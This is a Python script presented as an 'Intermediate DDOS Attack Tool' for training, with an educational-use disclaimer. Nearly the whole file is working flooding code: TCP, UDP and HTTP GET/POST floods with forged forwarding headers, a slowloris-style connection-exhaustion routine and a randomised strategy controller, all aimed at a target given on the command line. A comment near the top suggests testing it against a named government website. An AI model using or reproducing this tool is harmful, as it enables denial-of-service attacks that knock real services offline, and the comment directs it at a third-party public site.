#!/usr/bin/env python3
"""
Intermediate DDOS Attack Script
Author: HTB Training lxkhaninkali
Description: Multi-threaded DDOS with randomization and geographic distribution simulation
Educational Purpose Only - Use responsibly and legally
"""
## Test in this https://ahsec.assam.gov.in
import socket
import sys
import time
import random
import threading
import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import ipaddress

class IntermediateDDOS:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packets_sent = 0
        self.running = True
        self.attack_queue = queue.Queue()
        self.results = []
        self.proxy_list = []
        
    def generate_proxy_list(self):
        """Generate list of proxy servers for distributed attack simulation"""
        # Simulated proxy list (educational purposes)
        self.proxy_list = [
            {'ip': '192.168.1.10', 'port': 8080, 'country': 'US'},
            {'ip': '10.0.0.5', 'port': 3128, 'country': 'UK'}, 
            {'ip': '172.16.0.20', 'port': 8080, 'country': 'DE'},
            {'ip': '192.168.2.15', 'port': 9050, 'country': 'FR'},
            {'ip': '10.10.10.25', 'port': 8080, 'country': 'JP'}
        ]
        print(f"[+] Generated {len(self.proxy_list)} proxy nodes for distribution")
    
    def simulate_geolocation_attack(self, node_info, duration=60):
        """Simulate attack from different geographic locations"""
        node_id = node_info['ip']
        country = node_info['country']
        
        print(f"[*] Starting attack node from {country} ({node_id})")
        start_time = time.time()
        local_packets = 0
        
        # Simulate different attack patterns based on "location"
        attack_patterns = {
            'US': {'delay': (0.01, 0.05), 'burst_size': (10, 50)},
            'UK': {'delay': (0.02, 0.08), 'burst_size': (5, 30)},
            'DE': {'delay': (0.015, 0.06), 'burst_size': (8, 40)},
            'FR': {'delay': (0.03, 0.09), 'burst_size': (6, 25)},
            'JP': {'delay': (0.05, 0.12), 'burst_size': (15, 60)}
        }
        
        pattern = attack_patterns.get(country, attack_patterns['US'])
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # Random burst attack
                burst_size = random.randint(*pattern['burst_size'])
                
                for _ in range(burst_size):
                    if not self.running:
                        break
                        
                    attack_type = random.choice(['tcp_syn', 'udp_flood', 'http_get', 'http_post'])
                    
                    if attack_type == 'tcp_syn':
                        self.tcp_syn_attack(node_id, country)
                    elif attack_type == 'udp_flood':
                        self.udp_flood_attack(node_id, country)
                    elif attack_type == 'http_get':
                        self.http_get_attack(node_id, country)
                    elif attack_type == 'http_post':
                        self.http_post_attack(node_id, country)
                    
                    local_packets += 1
                    self.packets_sent += 1
                
                # Random delay between bursts
                delay = random.uniform(*pattern['delay'])
                time.sleep(delay)
                
            except Exception as e:
                pass
        
        print(f"[*] Node {country} ({node_id}) completed: {local_packets} packets sent")
        return local_packets
    
    def tcp_syn_attack(self, source_ip, country):
        """TCP SYN flood with geographic simulation"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            
            # Random source port
            source_port = random.randint(1024, 65535)
            
            # Attempt connection
            sock.connect((self.target_ip, self.target_port))
            sock.close()
            
        except:
            pass
    
    def udp_flood_attack(self, source_ip, country):
        """UDP flood with random payloads"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Generate random payload based on "country"
            payload_templates = {
                'US': b'ATTACK_FROM_US_' + bytes([random.randint(65, 90) for _ in range(20)]),
                'UK': b'UK_FLOOD_DATA_' + bytes([random.randint(65, 90) for _ in range(25)]),
                'DE': b'GERMAN_PAYLOAD_' + bytes([random.randint(65, 90) for _ in range(30)]),
                'FR': b'FRENCH_ATTACK_' + bytes([random.randint(65, 90) for _ in range(22)]),
                'JP': b'JAPAN_FLOOD___' + bytes([random.randint(65, 90) for _ in range(35)])
            }
            
            payload = payload_templates.get(country, b'DEFAULT_PAYLOAD' + bytes([random.randint(65, 90) for _ in range(20)]))
            
            # Send to target or random port
            port = self.target_port if self.target_port != 0 else random.randint(1, 65535)
            sock.sendto(payload, (self.target_ip, port))
            sock.close()
            
        except:
            pass
    
    def http_get_attack(self, source_ip, country):
        """HTTP GET flood with regional characteristics"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target_ip, self.target_port))
            
            # Regional user agents
            user_agents = {
                'US': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124',
                'UK': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
                'DE': 'Mozilla/5.0 (X11; Linux x86_64) Firefox/89.0',
                'FR': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/91.0.864.59',
                'JP': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/89.0'
            }
            
            user_agent = user_agents.get(country, user_agents['US'])
            path = f"/{country.lower()}_attack_{random.randint(1000, 9999)}.html"
            
            request = f"GET {path} HTTP/1.1\\r\\n"
            request += f"Host: {self.target_ip}\\r\\n"
            request += f"User-Agent: {user_agent}\\r\\n"
            request += f"X-Forwarded-For: {source_ip}\\r\\n"
            request += f"X-Real-IP: {source_ip}\\r\\n"
            request += "Connection: keep-alive\\r\\n"
            request += "Accept: text/html,application/xhtml+xml\\r\\n\\r\\n"
            
            sock.send(request.encode())
            sock.close()
            
        except:
            pass
    
    def http_post_attack(self, source_ip, country):
        """HTTP POST attack with form data"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target_ip, self.target_port))
            
            # Generate POST data based on country
            post_data = f"country={country}&attack_id={random.randint(10000, 99999)}&payload={'A' * random.randint(100, 500)}"
            content_length = len(post_data)
            
            request = f"POST /submit HTTP/1.1\\r\\n"
            request += f"Host: {self.target_ip}\\r\\n"
            request += f"Content-Type: application/x-www-form-urlencoded\\r\\n"
            request += f"Content-Length: {content_length}\\r\\n"
            request += f"X-Forwarded-For: {source_ip}\\r\\n"
            request += "Connection: close\\r\\n\\r\\n"
            request += post_data
            
            sock.send(request.encode())
            sock.close()
            
        except:
            pass
    
    def resource_exhaustion_attack(self, duration=30):
        """Specialized resource exhaustion attack"""
        print("[*] Starting resource exhaustion attack...")
        start_time = time.time()
        connections = []
        
        # Create many persistent connections
        while self.running and (time.time() - start_time) < duration:
            try:
                for _ in range(50):  # Create 50 connections per iteration
                    if not self.running:
                        break
                        
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Send partial HTTP request to keep connection alive
                    partial_request = "GET / HTTP/1.1\\r\\nHost: {}\\r\\n".format(self.target_ip)
                    sock.send(partial_request.encode())
                    
                    connections.append(sock)
                    self.packets_sent += 1
                
                # Clean up dead connections
                alive_connections = []
                for sock in connections:
                    try:
                        # Send keep-alive
                        sock.send(b"X-Keep-Alive: timeout=5\\r\\n")
                        alive_connections.append(sock)
                    except:
                        try:
                            sock.close()
                        except:
                            pass
                
                connections = alive_connections
                print(f"[+] Resource exhaustion: {len(connections)} active connections")
                
                time.sleep(2)
                
            except Exception as e:
                pass
        
        # Clean up all connections
        for sock in connections:
            try:
                sock.close()
            except:
                pass
        
        print(f"[*] Resource exhaustion completed")
    
    def adaptive_attack_controller(self, duration=120):
        """Adaptive attack that changes strategy based on responses"""
        print("[*] Starting adaptive attack controller...")
        start_time = time.time()
        
        attack_strategies = ['burst', 'sustained', 'random', 'coordinated']
        current_strategy = random.choice(attack_strategies)
        strategy_change_interval = 30  # Change strategy every 30 seconds
        last_strategy_change = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            # Check if we should change strategy
            if (time.time() - last_strategy_change) > strategy_change_interval:
                current_strategy = random.choice(attack_strategies)
                last_strategy_change = time.time()
                print(f"[*] Switching to {current_strategy} attack strategy")
            
            # Execute current strategy
            if current_strategy == 'burst':
                self.execute_burst_strategy()
            elif current_strategy == 'sustained':
                self.execute_sustained_strategy()
            elif current_strategy == 'random':
                self.execute_random_strategy()
            elif current_strategy == 'coordinated':
                self.execute_coordinated_strategy()
            
            time.sleep(1)
    
    def execute_burst_strategy(self):
        """Execute burst attack strategy"""
        for _ in range(random.randint(20, 50)):
            if not self.running:
                break
            self.tcp_syn_attack('192.168.1.100', 'BURST')
            self.packets_sent += 1
    
    def execute_sustained_strategy(self):
        """Execute sustained attack strategy"""
        for _ in range(5):
            if not self.running:
                break
            self.udp_flood_attack('192.168.1.100', 'SUSTAINED')
            self.packets_sent += 1
        time.sleep(0.1)
    
    def execute_random_strategy(self):
        """Execute random attack strategy"""
        attack_count = random.randint(1, 15)
        for _ in range(attack_count):
            if not self.running:
                break
            attack_type = random.choice(['tcp', 'udp', 'http'])
            if attack_type == 'tcp':
                self.tcp_syn_attack('192.168.1.100', 'RANDOM')
            elif attack_type == 'udp':
                self.udp_flood_attack('192.168.1.100', 'RANDOM')
            else:
                self.http_get_attack('192.168.1.100', 'RANDOM')
            self.packets_sent += 1
        time.sleep(random.uniform(0.05, 0.3))
    
    def execute_coordinated_strategy(self):
        """Execute coordinated attack strategy"""
        # Simulate coordination between multiple nodes
        for country in ['US', 'UK', 'DE']:
            if not self.running:
                break
            self.http_post_attack('192.168.1.100', country)
            self.packets_sent += 1
        time.sleep(0.05)
    
    def launch_intermediate_attack(self, num_nodes=8, duration=120, include_adaptive=True):
        """Launch comprehensive intermediate DDOS attack"""
        print(f"[*] Launching intermediate DDOS attack")
        print(f"[*] Geographic nodes: {num_nodes}")
        print(f"[*] Duration: {duration} seconds")
        print(f"[*] Adaptive controller: {'Enabled' if include_adaptive else 'Disabled'}")
        
        # Generate proxy list for geographic simulation
        self.generate_proxy_list()
        
        with ThreadPoolExecutor(max_workers=num_nodes + 3) as executor:
            futures = []
            
            # Start geographic attack nodes
            for i in range(min(num_nodes, len(self.proxy_list))):
                proxy = self.proxy_list[i]
                future = executor.submit(self.simulate_geolocation_attack, proxy, duration)
                futures.append(future)
            
            # Start resource exhaustion attack
            future = executor.submit(self.resource_exhaustion_attack, duration // 2)
            futures.append(future)
            
            # Start adaptive controller if enabled
            if include_adaptive:
                future = executor.submit(self.adaptive_attack_controller, duration)
                futures.append(future)
            
            # Monitor progress
            start_time = time.time()
            while (time.time() - start_time) < duration:
                time.sleep(10)
                completed = sum(1 for f in futures if f.done())
                active = len(futures) - completed
                print(f"[+] Active threads: {active}, Completed: {completed}, Total packets: {self.packets_sent}")
            
            self.running = False
            
            # Collect results
            for future in as_completed(futures, timeout=30):
                try:
                    result = future.result()
                    if result:
                        self.results.append(result)
                except Exception as e:
                    pass
        
        print(f"[*] Intermediate DDOS attack completed")
        print(f"[*] Total packets sent: {self.packets_sent}")
        print(f"[*] Average packets per node: {self.packets_sent // max(len(self.results), 1)}")

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 ddos_intermediate.py <target_ip> <target_port> [nodes] [duration] [adaptive]")
        print("Example: python3 ddos_intermediate.py 192.168.1.100 80 10 180 true")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_nodes = int(sys.argv[3]) if len(sys.argv) > 3 else 8
    duration = int(sys.argv[4]) if len(sys.argv) > 4 else 120
    adaptive = sys.argv[5].lower() == 'true' if len(sys.argv) > 5 else True
    
    print("="*70)
    print("INTERMEDIATE DDOS ATTACK TOOL")
    print("="*70)
    print(f"Target: {target_ip}:{target_port}")
    print(f"Geographic nodes: {num_nodes}")
    print(f"Duration: {duration} seconds")
    print(f"Adaptive attacks: {'Enabled' if adaptive else 'Disabled'}")
    print("Features: Geographic simulation, adaptive strategies, resource exhaustion")
    print("WARNING: Use only on systems you own or have permission to test!")
    print("="*70)
    
    # Confirm attack
    confirm = input("Continue with intermediate DDOS attack? (y/N): ")
    if confirm.lower() != 'y':
        print("[!] Attack cancelled")
        sys.exit(0)
    
    ddos_attack = IntermediateDDOS(target_ip, target_port)
    
    try:
        ddos_attack.launch_intermediate_attack(num_nodes, duration, adaptive)
    except KeyboardInterrupt:
        print("\\n[!] Attack interrupted by user")
        ddos_attack.running = False

if __name__ == "__main__":
    main()
